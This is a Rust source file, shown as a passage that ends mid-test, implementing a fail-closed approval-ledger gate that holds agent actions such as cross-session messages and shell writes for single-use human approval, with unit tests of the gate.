//! The approval-ledger gate — shared by `kj` verbs with external effects
//! ([`crate::kj::cc`]) and the `shell_write` gate ([`crate::kj::shell_gate`]).
//!
//! First consumer: `kj cc send` — injecting a turn into a Claude Code
//! session is exactly the "agent action a human should authorize" case the
//! ledger exists for (Amy, 2026-08-16: *"yeah kj cc send should go through
//! the ledger"*). The shape here is the template gate slice 1a
//! (`docs/issues.md`) extended, then, to `shell_write`
//! (`docs/gate-and-shell-split.md`, "Slice 4").
//!
//! A [`GateSpec`] carries an ORDERED list of [`GatedStatement`]s, not one —
//! `kj cc send` happens to gate exactly one, `shell_write` gates every
//! top-level statement a submission's `plan_program()` produces.
//! [`AskCoverage::verdict`] (`approval-ledger`) composes across the whole
//! list: a single denied statement denies the entire call, every statement
//! must be covered to auto-allow, anything else escalates — a
//! partially-covered submission is never partially applied, because there is
//! no way to run "just the allowed half" of one submitted blob (see
//! `docs/gate-and-shell-split.md`, "The crux").
//!
//! ## The flow
//!
//! 1. **Rules first** — [`approval_ledger::rules::redeem`] checks whether an
//!    active rule already covers the statement. A `Deny` rule denies without
//!    asking anyone; an `Allow` rule auto-allows; both still leave a durable
//!    ask row (created, then decided with `auto_reason`) so the audit trail
//!    is complete. With the free-variable statement this gate builds, allow
//!    rules cannot exist (ledger guarantee 3), so in practice everything
//!    escalates — deliberately, until fan-out exists.
//! 2. **Durable before asked** — [`approval_ledger::ask::create_ask`]
//!    commits before anything waits (ledger guarantee 1). The ask row is the
//!    durable record regardless of how the wait ends.
//! 3. **Return, without waiting.** The gate hands back
//!    [`GateVerdict::Pending`] with the request id and nothing runs. A human
//!    answers from `kj ledger` whenever they answer — minutes or a night
//!    later — and the next attempt at the same request redeems that answer
//!    once (step 2 above). Fail-closed throughout: an unanswered ask
//!    authorizes nothing, and no clock ever turns absence into permission.
//!    Why nothing blocks: `docs/gate-resume.md`.
//!
//! ## Two findings from the gate research pass, honored here
//!
//! - **`authorized_label` is the RAW typed reference** (finding #3) — what
//!   the caller typed, never a resolved id/label. For `kj cc send` that is
//!   the target string exactly as given.
//!
//! ## Answering
//!
//! From any shell: `kj ledger list`, `kj ledger allow <id>` /
//! `kj ledger deny <id>` (see [`crate::kj::ledger`]). The ledger's claim
//! race (guarantee 5) makes concurrent answers safe: exactly one answerer
//! wins, losers read a loud `AlreadyDecided`/claim failure, never a silent
//! no-op.

use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::{Arc, Mutex, OnceLock};

use approval_ledger::types::{
    ApprovalStatus, AskCoverage, AskVerdict, NewAsk, NewOption, NewPlanCommand, NewPlanStatement,
    NewPlanVar, NewPlannedValue, Origin, StatementVerdict, VarBinding,
};

use kaijutsu_types::{AskRef, AskStatus};

use crate::flows::SharedLedgerFlowBus;
use crate::kernel_db::KernelDb;
use crate::kj::KjCaller;

/// How a gate wait ended — a decision, or the absence of one.
///
/// The three-way split exists because "the gate said no" and "the gate
/// could not do its job" are different facts, and collapsing them is its
/// own failure family: a fault that reads as a policy decision teaches a
/// caller the wrong lesson (*that action is refused*) about a control that
/// was simply absent. The `shell_write` caller renders both as one error so
/// it never noticed, but the hook path must map them to `McpError::Denied`
/// and `McpError::GateUnavailable` respectively.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum GateVerdict {
    /// A human or a rule decided yes.
    Allowed,
    /// A human or a rule decided no. A real verdict.
    Denied,
    /// No decision was reached: the ledger could not be read or written, or
    /// the ask row went missing. Still fail-closed — the call does not
    /// proceed — but it is not a verdict, and must never be reported as one.
    Unavailable,
    /// A durable ask is waiting for a human, and **nothing ran**. Not a
    /// refusal and not a fault: the question was asked and is answerable
    /// from `kj ledger` for as long as it takes. The action runs when the
    /// answer lands, not when this call returns.
    ///
    /// Fail-closed like the others — `allowed()` is false — so a caller that
    /// only asks "may I proceed" needs no change to stay safe. A caller that
    /// tells a model what happened should distinguish it: "denied" and
    /// "still waiting" teach opposite lessons.
    Pending,
}

/// Translate the ledger's status into the one the wire carries.
///
/// The two enums are separate because `approval-ledger` and
/// `kaijutsu-types` are independent leaves. This is the single crossing
/// point, and `ask_status_covers_every_ledger_status` below is what keeps a
/// new ledger variant from arriving on the wire as something else.
pub(crate) fn ask_status(status: ApprovalStatus) -> AskStatus {
    match status {
        ApprovalStatus::Pending => AskStatus::Pending,
        ApprovalStatus::Claimed => AskStatus::Claimed,
        ApprovalStatus::Allowed => AskStatus::Allowed,
        ApprovalStatus::Denied => AskStatus::Denied,
        ApprovalStatus::Expired => AskStatus::Expired,
        ApprovalStatus::Abandoned => AskStatus::Abandoned,
    }
}

/// Build the durable-ask reference an outcome carries.
pub(crate) fn ask_ref(request_id: String, status: ApprovalStatus) -> AskRef {
    AskRef { request_id, status: ask_status(status) }
}

/// How a gate wait ended.
#[derive(Debug, Clone)]
pub(crate) struct GateOutcome {
    pub verdict: GateVerdict,
    /// The ledger row this outcome belongs to, when there is one. `None`
    /// means the gate failed before recording anything: there is no id to
    /// show a human and nothing for `kj ledger` to find, and saying so
    /// beats printing an empty string where an id belongs.
    pub ask: Option<AskRef>,
    /// Human-readable reason, always populated — on refusal it says exactly
    /// why (denied by whom, expired after how long, which rule fired).
    pub reason: String,
    /// The context's cwd at the moment its ask escalated, handed back
    /// exactly once — on the redemption that spends the answer and turns
    /// `Allowed`. An approval authorizes the operation it was asked about,
    /// not a similar one run wherever the context's cwd has since moved to
    /// (see [`pin_cwd`]). `None` on every other outcome: a rule-matched
    /// auto-allow never escalated, so nothing was pinned; a denial does not
    /// need a directory to run in; and a caller with no `context_id` had
    /// nothing to pin in the first place.
    pub cwd: Option<PathBuf>,
}

/// What a player does about a pending ask. "waiting for a human" is
/// deliberately absent: that fact belongs to `McpError::GatePending`, which
/// wraps this, and stating it here made the composed message say it three
/// times. Named rather than inline so the layering test reads the real text.
pub const PENDING_REASON: &str = "nothing was run. Answer with `kj ledger \
     allow <id>` or `kj ledger deny <id>`, then run the same command again — \
     an allowed ask authorizes it exactly once.";

impl GateOutcome {
    /// Whether the gated action may proceed. The only question callers that
    /// do not distinguish a fault from a refusal need to ask.
    pub fn allowed(&self) -> bool {
        matches!(self.verdict, GateVerdict::Allowed)
    }

    /// `"<id> (<status>)"`, or a plain statement that nothing was recorded.
    /// Callers put this in the message a model reads, so it must never
    /// render a blank where an ask id is expected.
    /// The one-line summary the hook layers wrap: which ask, and what to do
    /// about it. `McpError::GatePending`/`GateUnavailable` already name the
    /// hook and the state, so this adds neither — see
    /// `docs/gate-and-shell-split.md`, "One fact per layer".
    pub fn ask_summary(&self) -> String {
        format!("{} — {}", self.ask_description(), self.reason)
    }

    pub fn ask_description(&self) -> String {
        match &self.ask {
            Some(a) => format!("ask {} ({})", a.request_id, a.status),
            None => "no ask was recorded".to_string(),
        }
    }

    /// A fault before anything durable existed.
    fn unavailable_without_row(reason: String) -> Self {
        Self { verdict: GateVerdict::Unavailable, ask: None, reason, cwd: None }
    }
}

/// One statement inside a [`GateSpec`] — a ledger statement in waiting.
///
/// `rendered` is the statement text (with `${VAR}` placeholders for a
/// synthetic `kj`-verb statement, or the real kaish source for a
/// `shell_write` statement); `vars` names each variable the statement reads
/// or binds. The ledger refuses to learn ALLOW rules for a statement with
/// any free variable (guarantee 3) — which is precisely why
/// [`crate::kj::cc`] marks its message body free: every send stays
/// human-approved until the policy changes deliberately.
#[derive(Debug)]
pub(crate) struct GatedStatement {
    pub rendered: String,
    /// The statement's kind (`"kj_verb"` for a synthetic verb statement;
    /// kaish's own `Plan::statement_kind` — `"command"`, `"pipeline"`,
    /// `"for"`, … — for a `shell_write` statement).
    pub statement_kind: String,
    pub vars: Vec<(String, VarBinding)>,
    /// The statement's position in the ORIGINAL kaish source, when this
    /// statement came from `plan_program()` — `PlannedStatement::index`,
    /// counted BEFORE empty statements (a blank line, a comment) are
    /// dropped. `None` for a synthetic `kj`-verb statement, which has no
    /// source program to be a position in.
    ///
    /// Carried through so a refusal can name which statement in the
    /// caller's ORIGINAL submission is blamed. This must never be
    /// re-derived by enumerating `GateSpec::statements` itself — that Vec
    /// is already post-filter, so re-deriving a position from it reproduces
    /// exactly the gap kaish's own `plan_program` doc warns about (a leading
    /// comment or blank line shifts every index after it). Carry the
    /// PUBLISHED index, never recompute one.
    pub source_index: Option<usize>,
}

/// One gated action: an ordered list of [`GatedStatement`]s sharing one
/// `authorized_label` and answered as a single ask (see module docs — the
/// crux is that a submission can only be gated as a whole).
#[derive(Debug)]
pub(crate) struct GateSpec {
    pub origin: Origin,
    /// Ledger `instance` column, e.g. `"builtin.kj"` or `"builtin.shell_write"`.
    ///
    /// Owned rather than `&'static str` because a hook ask names whatever
    /// instance the hooked call was headed for, which is only known at fire
    /// time. The two static callers pay one allocation per gate, at human
    /// answer rates.
    pub instance: String,
    /// Ledger `tool` column, e.g. `"cc.send"` or `"shell_write"`.
    pub tool: String,
    /// The `HookEntry` id, when this ask came from a hook's `Ask` action.
    /// `None` for a gate a `kj` verb or the shell tool opened on itself.
    pub hook_id: Option<String>,
    /// Human-readable summary shown to whoever answers.
    pub description: String,
    /// The RAW typed reference (research-pass finding #3) — never a resolved
    /// label or id. For `shell_write`, the submitted source text itself:
    /// there is no separate "target" to resolve, so what the caller typed
    /// IS the whole statement.
    pub authorized_label: String,
    pub statements: Vec<GatedStatement>,
}

/// Statement digest: the ledger keys statements by an opaque
/// content-address string (`approval_statements.statement_digest`), so the
/// requirement is uniqueness per distinct statement, not a specific hash.
/// A namespaced, labeled digest of the rendered text gives exactly that,
/// stays stable across kernels, and reads for free in a `sqlite3` session —
/// no new crypto dependency for one gate.
///
/// Namespaced by [`Origin`] so a `kj cc send` statement and a `shell_write`
/// statement that happen to render identical text (e.g. both spell `rm x`)
/// never share a digest — a rule taught for one origin must never silently
/// redeem an ask from the other. `KjVerb`'s prefix (`"kj-verb"`, hyphenated)
/// is unchanged from before this gate went multi-origin, so any rule
/// already taught for `kj cc send` keeps matching.
fn statement_digest(origin: Origin, rendered: &str) -> String {
    match origin {
        Origin::KjVerb => format!("kj-verb:v1:{rendered}"),
        Origin::ShellGate => format!("shell-stmt:v1:{rendered}"),
        Origin::Hook => format!("hook:v1:{rendered}"),
    }
}

fn caller_context_bytes(caller: &KjCaller) -> Vec<u8> {
    caller
        .context_id
        .map(|c| c.as_bytes().to_vec())
        .unwrap_or_default()
}

/// The cwd an escalated ask was asked in, keyed by `request_id` and living
/// for exactly the process's lifetime — not a table, and not durable.
///
/// A pending ask is swept to `abandoned` at kernel boot (nothing durable
/// carries a pending ask across a restart), so a pin tied to an ask's
/// lifetime can never outlive it either: a `HashMap` behind a `Mutex` is
/// exactly the right shape, with no persistence layer to keep coherent with
/// the ledger. `request_id` is a UUID, so entries from different kernels
/// sharing one test process cannot collide.
fn cwd_pins() -> &'static Mutex<HashMap<String, PathBuf>> {
    static PINS: OnceLock<Mutex<HashMap<String, PathBuf>>> = OnceLock::new();
    PINS.get_or_init(|| Mutex::new(HashMap::new()))
}

/// Lock the pin map, recovering from poisoning rather than propagating it
/// forever. `insert`/`remove`/`get` on a `HashMap` have no cross-entry
/// invariant a panic partway through could leave broken, so a panic
/// elsewhere while this lock was held costs at most the one pin in flight —
/// not every `shell_write` gate for the rest of this kernel process's life.
/// A lost pin is already a handled case (`GateOutcome::cwd` is `None`,
/// unpinned, same as before this mechanism existed), so recovering here
/// degrades to that, never to a wrong directory.
fn lock_pins() -> std::sync::MutexGuard<'static, HashMap<String, PathBuf>> {
    cwd_pins().lock().unwrap_or_else(|poisoned| poisoned.into_inner())
}

/// Capture the caller's persisted cwd under `request_id` at the moment its
/// ask escalates — read the same way `EmbeddedKaish::restore_cwd_from_db`
/// reads it, so the pin matches what a human sees echoed in `kj ledger
/// show`. An approval given later must run in this directory, not wherever
/// the context has `cd`ed to by the time a human answers.
///
/// A caller with no `context_id` (a synthetic or internal caller) has no
/// persisted cwd to protect, so nothing is pinned; its later redemption
/// runs without a directory override, same as before this pin existed.
fn pin_cwd(db: &Arc<parking_lot::Mutex<KernelDb>>, caller: &KjCaller, request_id: &str) {
    let Some(context_id) = caller.context_id else {
        return;
    };
    let cwd = {
        let db = db.lock();
        db.get_context_shell(context_id).ok().flatten().and_then(|row| row.cwd)
    };
    if let Some(cwd) = cwd {
        lock_pins().insert(request_id.to_string(), PathBuf::from(cwd));
    }
}

/// Take (remove) the cwd pinned for `request_id`, if any. Single-use like
/// the answer it belongs to: a second call for the same `request_id`
/// returns `None`, never the stale value.
fn take_pinned_cwd(request_id: &str) -> Option<PathBuf> {
    lock_pins().remove(request_id)
}

fn build_ask(caller: &KjCaller, spec: &GateSpec) -> NewAsk {
    NewAsk {
        context_id: caller_context_bytes(caller),
        principal_id: caller.principal_id.as_bytes().to_vec(),
        origin: spec.origin,
        instance: Some(spec.instance.clone()),
        tool: Some(spec.tool.clone()),
        hook_id: spec.hook_id.clone(),
        description: spec.description.clone(),
        statements: spec
            .statements
            .iter()
            .map(|s| NewPlanStatement {
                statement_digest: statement_digest(spec.origin, &s.rendered),
                rendered: s.rendered.clone(),
                statement_kind: s.statement_kind.clone(),
                // A synthetic single command wrapping the whole rendered
                // text — NOT kaish's real per-command/per-arg structure.
                // `rendered` (shown verbatim by `kj ledger show`) is the
                // full-fidelity surface a human reads; this satisfies the
                // schema's NOT NULL `approval_plan_commands` row without
                // claiming a command-level breakdown this gate doesn't
                // build. Threading kaish's real `PlannedCommand` tree
                // through here is future work, not required for Slice 4.
                commands: vec![NewPlanCommand {
                    name: spec.tool.clone(),
                    args: vec![NewPlannedValue::Plain(s.rendered.clone())],
                    redirects: vec![],
                    backgrounded: false,
                }],
                vars: s
                    .vars
                    .iter()
                    .map(|(name, binding)| NewPlanVar {
                        name: name.clone(),
                        binding: *binding,
                    })
                    .collect(),
            })
            .collect(),
        authorized_label: Some(spec.authorized_label.clone()),
        rc_run_id: None,
        expires_at: None,
        options: vec![
            NewOption {
                option_id: "allow_once".into(),
                label: "Allow once".into(),
                kind: "allow_once".into(),
            },
            NewOption {
                option_id: "deny".into(),
                label: "Deny".into(),
                kind: "deny".into(),
            },
        ],
        signals: vec![],
    }
}

/// Truncate a statement's rendered text for a one-line reason string — the
/// full text is always available via `kj ledger show <id>`.
fn truncate_for_reason(s: &str) -> String {
    const LIMIT: usize = 120;
    if s.chars().count() <= LIMIT {
        return s.replace('\n', "⏎");
    }
    let head: String = s.chars().take(LIMIT).collect();
    format!("{}…", head.replace('\n', "⏎"))
}

/// Describe a rule-composed verdict for the human/model-facing reason
/// string, naming exactly which statement(s) an active DENY rule matched —
/// using the SOURCE index the caller published for each statement
/// (`GatedStatement::source_index`), never a position re-derived by
/// enumerating `statements` (see that field's doc for why the two can
/// disagree).
fn describe_rule_coverage(statements: &[GatedStatement], coverage: &AskCoverage, allow: bool) -> String {
    if allow {
        return "rule coverage: every statement matched an active allow rule".to_string();
    }
    let offenders: Vec<String> = coverage
        .per_statement
        .iter()
        .zip(statements.iter())
        .filter(|(v, _)| matches!(v, StatementVerdict::Deny(_)))
        .map(|(_, s)| match s.source_index {
            Some(idx) => format!("statement #{idx} (`{}`)", truncate_for_reason(&s.rendered)),
            None => format!("`{}`", truncate_for_reason(&s.rendered)),
        })
        .collect();
    format!(
        "rule coverage: a statement matched an active deny rule — {}",
        offenders.join(", ")
    )
}

/// Announce that the approval ledger moved, to anyone subscribed.
///
/// **Call this only AFTER the mutation has committed** — commands express
/// intent, events express accepted facts, and we never publish one we have
/// not durably accepted (CLAUDE.md, "Durable state and the wire"). Reading
/// the generation back out of the ledger rather than taking one from the
/// caller is what enforces that here: the number published is by
/// construction one SQLite has already assigned inside the committed
/// transaction, so there is no way to announce a generation belonging to a
/// transaction that later rolled back.
///
/// Deliberately infallible from the caller's view. A lost notification costs
/// a subscriber a late poll and nothing else — the ledger, not this message,
/// is the authority, and every answer still goes through `claim`/`decide`.
/// Failing an approval that was decided correctly, because we could not
/// *gossip* about it, would be much the worse outcome, so a read failure is
/// logged and swallowed. This is a hint channel; it is not in the decision
/// path and must never become one.
pub(crate) fn announce_ledger_change(
    db: &Arc<parking_lot::Mutex<KernelDb>>,
    bus: &SharedLedgerFlowBus,
) {
    let generation = {
        let db = db.lock();
        match approval_ledger::generation::current(db.conn_for_ledger()) {
            Ok(g) => g,
            Err(e) => {
                tracing::warn!(
                    "approval-ledger generation unreadable, skipping the change \
                     notification (subscribers find out on their next poll): {e}"
                );
                return;
            }
        }
    };
    bus.publish(crate::flows::LedgerFlow::Changed { generation });
}

/// Run the gate: rules → an already-answered ask → a durable ask, returning
/// immediately in every case.
///
/// **Nothing here waits.** A gated call that needs a human returns
/// [`GateVerdict::Pending`] with the ask id; the human answers whenever they
/// answer, and the action runs then. See `docs/gate-resume.md` for why the
/// blocking shape could not reach the waits it was asked for.
///
/// `ledger_flows` receives a fire-and-forget notification after each durable
/// ledger transition here, so a client learns an answer is wanted the moment
/// the row commits.
pub(crate) async fn run_gate(
    db: &Arc<parking_lot::Mutex<KernelDb>>,
    caller: &KjCaller,
    spec: GateSpec,
    ledger_flows: &SharedLedgerFlowBus,
) -> GateOutcome {
    let context = caller_context_bytes(caller);
    let principal = caller.principal_id.as_bytes().to_vec();
    let digests: Vec<String> = spec
        .statements
        .iter()
        .map(|s| statement_digest(spec.origin, &s.rendered))
        .collect();
    let digest_refs: Vec<&str> = digests.iter().map(String::as_str).collect();

    // 1. Rules first — an explicit DENY rule on ANY statement short-circuits
    //    the WHOLE submission without asking anyone (deny wins); every
    //    statement covered by an ALLOW rule auto-allows the whole
    //    submission; anything else (including partial coverage) escalates —
    //    `AskCoverage::verdict()` composes this, never applying a submission
    //    partially (module docs: there is no way to run "just the allowed
    //    half" of one submitted blob). Both terminal outcomes leave a
    //    durable row.
    let coverage = {
        let db = db.lock();
        match approval_ledger::rules::redeem(
            db.conn_for_ledger(),
            &digest_refs,
            &spec.authorized_label,
            Some(context.as_slice()),
            Some(principal.as_slice()),
        ) {
            Ok(coverage) => coverage,
            Err(e) => {
                return GateOutcome::unavailable_without_row(format!(
                    "approval gate could not read its rules: {e} (fail-closed — this is a \
                     ledger fault, not a decision)"
                ));
            }
        }
    };
    let verdict = coverage.verdict();

    // 2. An answer already given. Nothing waits any more, so a caller told
    //    `Pending` comes back and asks again — and the human's answer is
    //    sitting in the ledger from last time. Delivering it here is what
    //    closes the loop; without this step the retry would build the same
    //    free-variable statement, find no rule (guarantee 3 forbids one),
    //    and create another ask, forever.
    //
    //    A denial is delivered the same way an approval is. Redeeming only
    //    approvals would leave a denied caller looping exactly as above,
    //    with the answer already given and no way for a human to stop it by
    //    answering again.
    //
    //    Strictly after the rules, so a DENY rule added since the answer
    //    still wins. Single-use by construction: `redeem_ask` succeeds for
    //    exactly one caller, so an approval authorizes one execution and
    //    never becomes a standing permission — that is what rules are for.
    if matches!(verdict, AskVerdict::Escalate) {
        let answered = {
            let db = db.lock();
            approval_ledger::ask::find_redeemable(
                db.conn_for_ledger(),
                &digest_refs,
                &spec.authorized_label,
                Some(context.as_slice()),
                Some(principal.as_slice()),
            )
            .and_then(|found| match found {
                Some((request_id, status)) => {
                    approval_ledger::decide::redeem_ask(db.conn_for_ledger(), &request_id)
                        .map(|won| won.then_some((request_id, status)))
                }
                None => Ok(None),
            })
        };
        match answered {
            Ok(Some((request_id, status))) => {
                announce_ledger_change(db, ledger_flows);
                let allowed = status.is_allowed();
                // Take the pin unconditionally — it is single-use like the
                // answer it belongs to, spent whether the answer was yes or
                // no — but surface it only on an allow; a denial runs
                // nothing, so it has no directory to run in.
                let cwd = take_pinned_cwd(&request_id).filter(|_| allowed);
                return GateOutcome {
                    verdict: if allowed { GateVerdict::Allowed } else { GateVerdict::Denied },
                    ask: Some(ask_ref(request_id, status)),
                    cwd,
                    reason: if allowed {
                        "an approval was already given for this exact request; \
                         it is now spent"
                            .to_string()
                    } else {
                        "this exact request was already denied by a human; \
                         nothing was run"
                            .to_string()
                    },
                };
            }
            // No answer waiting is the ordinary path — ask a human.
            Ok(None) => {}
            Err(e) => {
                return GateOutcome::unavailable_without_row(format!(
                    "approval gate could not check for an answer already given: {e} \
                     (fail-closed — this is a ledger fault, not a decision)"
                ));
            }
        }
    }

    let ask = build_ask(caller, &spec);

    // 3. Durable before asked — the row commits before anyone is told.
    let request_id = {
        let db = db.lock();
        match approval_ledger::ask::create_ask(db.conn_for_ledger(), &ask) {
            Ok(id) => id,
            Err(e) => {
                return GateOutcome::unavailable_without_row(format!(
                    "approval gate could not record the ask: {e} (fail-closed — this is a \
                     ledger fault, not a decision)"
                ));
            }
        }
    };

    // An auto decision still gets its durable row, decided immediately with
    // no human in the loop (`decided_by` None + `auto_reason` mark it).
    if matches!(verdict, AskVerdict::Allow | AskVerdict::Deny) {
        let allow = matches!(verdict, AskVerdict::Allow);
        let auto_reason = describe_rule_coverage(&spec.statements, &coverage, allow);
        let auto_reason = auto_reason.as_str();
        let row = {
            let db = db.lock();
            approval_ledger::decide::decide(
                db.conn_for_ledger(),
                &request_id,
                approval_ledger::decide::DecideInput {
                    allow,
                    decided_by: None,
                    decided_option: None,
                    remember_scope: None,
                    auto_reason: Some(auto_reason),
                },
            )
        };
        // Both the ask row and its auto-decision have committed by now.
        announce_ledger_change(db, ledger_flows);
        return match row {
            // A rule match never escalates, so there was never a pin to
            // hand back — `cwd: None` here is not a gap, it is the honest
            // fact that no ask (and no directory) was ever recorded.
            Ok(row) => GateOutcome {
                verdict: if row.status.is_allowed() {
                    GateVerdict::Allowed
                } else {
                    GateVerdict::Denied
                },
                ask: Some(ask_ref(request_id, row.status)),
                cwd: None,
                reason: auto_reason.to_string(),
            },
            // The ask committed and its decision did not, so the row exists
            // and is still pending — a fault, and one that leaves something
            // `kj ledger` can still be pointed at.
            Err(e) => GateOutcome {
                verdict: GateVerdict::Unavailable,
                ask: Some(ask_ref(request_id, ApprovalStatus::Pending)),
                cwd: None,
                reason: format!(
                    "approval gate could not record the rule decision: {e} (fail-closed — \
                     this is a ledger fault, not a decision)"
                ),
            },
        };
    }

    // 4. Escalate: record the question and return. Announce first, so a
    //    client learns an answer is wanted the moment the row commits — an
    //    ask nothing points at is answerable and undiscoverable at once.
    announce_ledger_change(db, ledger_flows);
    // Pin the cwd this ask was asked in — before anyone can answer it, so
    // there is no window where an answer could redeem against a pin that
    // was never taken. See `pin_cwd` for what happens with no `context_id`.
    pin_cwd(db, caller, &request_id);
    // The waiter can vanish without warning, and tuning budgets will never
    // stop that: a harness kills its hook on its own schedule (Claude Code
    // at five seconds, Codex at three for `SessionEnd`), a user interrupts,
    // a client disconnects, `Broker::call_tool` loses its cancellation race
    // and drops this future mid-poll. Any of those leaves the row `pending`
    // with nobody behind it — indistinguishable, in `kj ledger list`, from
    // an ask someone is actually waiting on. A human would answer it and
    // nothing would run, having been told that answering did something.
    //
    // So the signal is taken from the drop itself rather than from any one
    // cancellation path. The guard does not need to know WHY the waiter
    // left, which is the point: the ways to be killed are a moving target
    // and this catches the ones nobody has thought of yet.
    GateOutcome {
        verdict: GateVerdict::Pending,
        ask: Some(ask_ref(request_id, ApprovalStatus::Pending)),
        cwd: None,
        reason: PENDING_REASON.to_string(),
    }
}

#[cfg(test)]
mod tests {

    /// `AskStatus` mirrors `ApprovalStatus` across a crate boundary, so the
    /// two can drift. Two things stop that, and only one of them is this
    /// test: `ask_status`'s match has no catch-all arm, so a NEW ledger
    /// variant fails the build rather than mapping to something wrong. What
    /// a compiler cannot catch is a SWAPPED pair — both arms exist and both
    /// typecheck — and that is what comparing the rendered names catches.
    ///
    /// Falsified by exchanging any two arms of `ask_status`.
    #[test]
    fn ask_status_matches_the_ledger_status_it_mirrors() {
        for status in [
            ApprovalStatus::Pending,
            ApprovalStatus::Claimed,
            ApprovalStatus::Allowed,
            ApprovalStatus::Denied,
            ApprovalStatus::Expired,
            ApprovalStatus::Abandoned,
        ] {
            assert_eq!(
                ask_status(status).as_str(),
                status.as_str(),
                "{status} crosses to the wire as a different state",
            );
        }
    }

    /// The ledger's two live states are the wire's two open states. A poll
    /// stops on everything else, so a mistake here loops forever or gives up
    /// on an answerable ask.
    #[test]
    fn the_open_ask_states_are_the_ledger_s_live_ones() {
        for status in [ApprovalStatus::Pending, ApprovalStatus::Claimed] {
            assert!(ask_status(status).is_open(), "{status} should still be answerable");
        }
        for status in [
            ApprovalStatus::Allowed,
            ApprovalStatus::Denied,
            ApprovalStatus::Expired,
            ApprovalStatus::Abandoned,
        ] {
            assert!(!ask_status(status).is_open(), "{status} is terminal");
            assert!(status.is_terminal(), "the ledger agrees {status} is terminal");
        }
    }
    use super::*;
    use crate::kernel_db::ContextShellRow;
    use crate::kj::test_helpers::{
        caller_with_context, register_context, test_caller, test_dispatcher_with_timeouts,
    };
    use kaijutsu_types::TimeoutPolicy;

    fn cc_spec(target: &str) -> GateSpec {
        GateSpec {
            origin: Origin::KjVerb,
            instance: "builtin.kj".into(),
            tool: "cc.send".into(),
            hook_id: None,
            description: format!("send a cross-session message to CC session {target:?}"),
            authorized_label: target.to_string(),
            statements: vec![GatedStatement {
                rendered: "kj cc send ${TARGET} ${MESSAGE}".into(),
                statement_kind: "kj_verb".into(),
                vars: vec![
                    ("TARGET".into(), VarBinding::Bound),
                    ("MESSAGE".into(), VarBinding::Free),
                ],
                source_index: None,
            }],
        }
    }

    /// A spec with TWO statements — the `shell_write` shape, exercised here
    /// without depending on `crate::kj::shell_gate` so this module's tests
    /// stay a pure test of `run_gate`'s composition, not of the planner.
    fn two_statement_spec(label: &str, first: &str, second: &str, second_index: usize) -> GateSpec {
        GateSpec {
            origin: Origin::ShellGate,
            instance: "builtin.shell_write".into(),
            tool: "shell_write".into(),
            hook_id: None,
            description: format!("shell_write: {first:?}; {second:?}"),
            authorized_label: label.to_string(),
            statements: vec![
                GatedStatement {
                    rendered: first.to_string(),
                    statement_kind: "command".into(),
                    vars: vec![],
                    source_index: Some(second_index - 1),
                },
                GatedStatement {
                    rendered: second.to_string(),
                    statement_kind: "command".into(),
                    vars: vec![],
                    source_index: Some(second_index),
                },
            ],
        }
    }
    async fn gate_dispatcher() -> crate::kj::KjDispatcher {
        test_dispatcher_with_timeouts(TimeoutPolicy::default()).await
    }

    /// The one pending ask, for a test that has just escalated exactly one.
    fn pending_id(d: &crate::kj::KjDispatcher) -> String {
        let db = d.kernel_db.lock();
        approval_ledger::ask::list_pending(db.conn_for_ledger())
            .unwrap()
            .first()
            .expect("an escalated gate must leave a pending ask")
            .request_id
            .clone()
    }

    /// Answer an ask the way a human in another shell does — a DIFFERENT
    /// principal from the one that asked, via claim-then-decide.
    fn answer(d: &crate::kj::KjDispatcher, request_id: &str, allow: bool) {
        let answerer = kaijutsu_types::PrincipalId::new();
        // Another seat: peer-seat approval is allowed, self-approval is not.
        let from = kaijutsu_types::ContextId::new();
        let db = d.kernel_db.lock();
        approval_ledger::claim::claim(db.conn_for_ledger(), request_id, answerer.as_bytes())
            .unwrap();
        approval_ledger::decide::decide(
            db.conn_for_ledger(),
            request_id,
            approval_ledger::decide::DecideInput {
                allow,
                decided_by: Some(approval_ledger::decide::Answerer {
                    principal: answerer.as_bytes(),
                    context: Some(from.as_bytes()),
                }),
                decided_option: Some(if allow { "allow_once" } else { "deny" }),
                remember_scope: None,
                auto_reason: None,
            },
        )
        .unwrap();
    }

    /// An escalated gate records the question and returns — it does not
    /// wait, and it does not expire anything. The row it leaves is
    /// `Pending` and stays answerable for as long as a human takes.
    ///
    /// Falsified by returning `GateVerdict::Unavailable` from the escalate
    /// tail instead of `Pending`: the verdict assertion tripped. Reverted.
    #[tokio::test]
    async fn an_escalated_gate_returns_pending_and_leaves_a_durable_row() {
        let d = gate_dispatcher().await;
        let caller = test_caller();
        let outcome = run_gate(
            &d.kernel_db.clone(),
            &caller,
            cc_spec("kaijutsu-chan"),
            d.kernel.ledger_flows(),
        )
        .await;

        assert!(!outcome.allowed(), "an unanswered gate must not open");
        assert_eq!(
            outcome.verdict,
            GateVerdict::Pending,
            "nobody answered, so nothing was decided and nothing failed — the \
             question is simply open"
        );
        let ask = outcome.ask.as_ref().expect("an escalated ask has a row");
        assert_eq!(ask.status, AskStatus::Pending);
        assert!(!ask.request_id.is_empty());
        assert!(outcome.reason.contains("kj ledger allow"));

        // Guarantee 1, verified from the outside: the row is on disk,
        // still answerable, and carries the RAW typed label (finding #3).
        let db = d.kernel_db.clone();
        let db = db.lock();
        let row = approval_ledger::ask::get_approval(db.conn_for_ledger(), &ask.request_id)
            .unwrap()
            .expect("the ask row must exist after the gate returns");
        assert_eq!(row.status, ApprovalStatus::Pending);
        assert_eq!(row.authorized_label.as_deref(), Some("kaijutsu-chan"));
        assert_eq!(row.origin, Origin::KjVerb);
    }

    /// The loop the redemption step exists to close: ask, get `Pending`,
    /// a human answers from another principal, ask again — and the second
    /// attempt is allowed by the answer already given.
    ///
    /// Falsified by deleting the whole step-2 redemption block: the second
    /// attempt returned `Pending` with a NEW request id, which is the
    /// forever-loop this closes. Reverted.
    #[tokio::test]
    async fn an_answer_from_another_principal_is_redeemed_by_the_next_attempt() {
        let d = gate_dispatcher().await;
        let caller = test_caller();

        let first = run_gate(
            &d.kernel_db.clone(),
            &caller,
            cc_spec("kaijutsu-chan"),
            d.kernel.ledger_flows(),
        )
        .await;
        assert_eq!(first.verdict, GateVerdict::Pending);
        let request_id = pending_id(&d);
        answer(&d, &request_id, true);

        let second = run_gate(
            &d.kernel_db.clone(),
            &caller,
            cc_spec("kaijutsu-chan"),
            d.kernel.ledger_flows(),
        )
        .await;
        assert!(second.allowed(), "the answer already given must open the gate");
        assert_eq!(second.verdict, GateVerdict::Allowed);
        let ask = second.ask.expect("a redeemed ask has a row");
        assert_eq!(ask.status, AskStatus::Allowed);
        assert_eq!(
